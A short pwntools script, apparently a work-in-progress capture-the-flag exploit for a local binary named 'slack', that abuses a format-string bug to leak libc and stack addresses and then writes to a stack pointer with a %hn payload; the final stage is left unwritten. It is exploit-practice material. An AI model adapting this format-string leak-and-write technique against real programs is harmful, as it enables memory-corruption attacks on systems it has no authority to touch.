from pwn import *

# Libc
write_off = 0x0000000000114a20
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print(hex(libc.sym['__libc_start_main']))

io = process('./slack')
gdb.attach(io, api=True)
# 1st fmt (leak what we need)
io.recvuntil(b'Professional): ')
io.sendline(b'%3$p%25$p') #Main func begin address located at stack idx 23 (replace 1st leak at %3$p if needed)
io.recvuntil(b'0x')
leaks = io.recvline(keepends=False).split(b'0x')

libc_base = int(leaks[0], 16) - 23 - write_off
print(f'Libc base address: {hex(libc_base)}')
stack_leak = int(leaks[1], 16) # stack pointer to another stack (= stack ret main + 272) (idx of this stack = 55)
print(f'Stack Leak: {hex(stack_leak)}')
stack_ret_main = stack_leak - 272
print(f'Main\'s ret in stack: {hex(stack_ret_main)}')

# 2nd fmt (overwrite the stack pointer at idx 25 to stack ret main)
print(io.recvuntil(b'Professional): '))
payload = f'%{stack_ret_main%0x10000}p%25$hn'.encode()
print(payload)
io.sendline(payload)

# 3rd fmt (what to do???)
print(io.recvuntil(b'Professional): '))
io.interactive()